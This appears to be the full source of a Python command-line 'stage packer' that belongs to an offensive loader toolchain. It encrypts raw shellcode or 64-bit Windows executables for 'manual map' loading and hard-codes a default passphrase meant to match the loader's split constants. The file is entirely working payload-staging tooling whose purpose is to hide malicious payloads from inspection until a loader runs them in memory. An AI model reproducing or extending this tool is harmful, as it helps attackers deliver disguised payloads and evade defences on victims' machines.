"""Vanta Loom - stage packer.

Usage:
    python -I tools/loom.py pack payload.bin -o stage.venv
    python -I tools/loom.py pack app.exe -o stage.venv --no-compress
    python -I tools/loom.py unpack stage.venv -o payload.bin
    python -I tools/loom.py info stage.venv

The default passphrase matches the loader's split constants.  A deployment
should either rebuild the loader with new fragments or embed RCDATA 0x4e59
(handled by the forge tool) and pass the same value with --pass.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from loom_pkg import envelope  # noqa: E402

DEFAULT_PASSPHRASE = b"vanta:6f3a91c2d74e8b50a1c9e2d4f60b7a38"
DEFAULT_ROUNDS = 120_000


def is_pe_x64(data: bytes) -> bool:
    if len(data) < 0x40 or data[:2] != b"MZ":
        return False
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    if e_lfanew + 0x18 > len(data):
        return False
    if data[e_lfanew : e_lfanew + 4] != b"PE\0\0":
        return False
    machine = struct.unpack_from("<H", data, e_lfanew + 4)[0]
    magic = struct.unpack_from("<H", data, e_lfanew + 24)[0]
    return machine == 0x8664 and magic == 0x20B


def cmd_pack(args: argparse.Namespace) -> int:
    source = Path(args.input)
    data = source.read_bytes()
    if not data:
        print("[-] input is empty", file=sys.stderr)
        return 2
    pe = is_pe_x64(data)
    if data[:2] == b"MZ" and not pe:
        print("[-] input looks like a PE but is not PE32+ x86-64", file=sys.stderr)
        return 2
    if args.force_raw:
        pe = False
    if args.force_pe and not pe:
        print("[-] --force-pe requires a PE32+ x86-64 image", file=sys.stderr)
        return 2

    passphrase = args.passphrase.encode("utf-8") if args.passphrase else DEFAULT_PASSPHRASE
    blob = envelope.pack(
        data,
        passphrase,
        compress=not args.no_compress,
        pe_image=pe,
        rounds=args.rounds,
    )
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_bytes(blob)

    payload_sha = hashlib.sha256(data).hexdigest()
    blob_sha = hashlib.sha256(blob).hexdigest()
    print(f"[+] {source} -> {output}")
    print(f"    payload : {len(data)} bytes  sha256={payload_sha}")
    print(f"    envelope: {len(blob)} bytes  sha256={blob_sha}")
    print(f"    kind    : {'PE32+ (manual map)' if pe else 'raw shellcode'}")
    print(f"    rounds  : {args.rounds}")
    print(f"    pass    : {'<custom>' if args.passphrase else '<compiled default>'}")
    if args.json:
        Path(args.json).write_text(
            json.dumps(
                {
                    "input": str(source),
                    "output": str(output),
                    "payload_len": len(data),
                    "payload_sha256": payload_sha,
                    "envelope_len": len(blob),
                    "envelope_sha256": blob_sha,
                    "pe_image": pe,
                    "rounds": args.rounds,
                },
                indent=2,
            ),
            encoding="utf-8",
        )
    return 0


def cmd_unpack(args: argparse.Namespace) -> int:
    passphrase = args.passphrase.encode("utf-8") if args.passphrase else DEFAULT_PASSPHRASE
    payload, meta = envelope.unpack(Path(args.input).read_bytes(), passphrase)
    output = Path(args.output)
    output.parent.mkdir(parents=True, exist_ok=True)
    output.write_bytes(payload)
    print(f"[+] {args.input} -> {output} ({len(payload)} bytes)")
    print("    meta: " + json.dumps({k: v for k, v in meta.items() if k not in ("salt", "nonce")}))
    return 0


def cmd_info(args: argparse.Namespace) -> int:
    passphrase = args.passphrase.encode("utf-8") if args.passphrase else DEFAULT_PASSPHRASE
    payload, meta = envelope.unpack(Path(args.input).read_bytes(), passphrase, verify_digest=False)
    print(json.dumps({**meta, "payload_sha256": hashlib.sha256(payload).hexdigest()}, indent=2))
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="loom", description="Vanta stage packer")
    sub = parser.add_subparsers(dest="command", required=True)

    pack = sub.add_parser("pack", help="encrypt a payload into a VENV/1 envelope")
    pack.add_argument("input")
    pack.add_argument("-o", "--output", required=True)
    pack.add_argument("--passphrase", default=None)
    pack.add_argument("--rounds", type=int, default=DEFAULT_ROUNDS)
    pack.add_argument("--no-compress", action="store_true")
    pack.add_argument("--force-raw", action="store_true")
    pack.add_argument("--force-pe", action="store_true")
    pack.add_argument("--json", default=None, help="write a JSON manifest")
    pack.set_defaults(func=cmd_pack)

    unpack = sub.add_parser("unpack", help="decrypt an envelope")
    unpack.add_argument("input")
    unpack.add_argument("-o", "--output", required=True)
    unpack.add_argument("--passphrase", default=None)
    unpack.set_defaults(func=cmd_unpack)

    info = sub.add_parser("info", help="decrypt and print envelope metadata")
    info.add_argument("input")
    info.add_argument("--passphrase", default=None)
    info.set_defaults(func=cmd_info)
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        return int(args.func(args))
    except ValueError as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
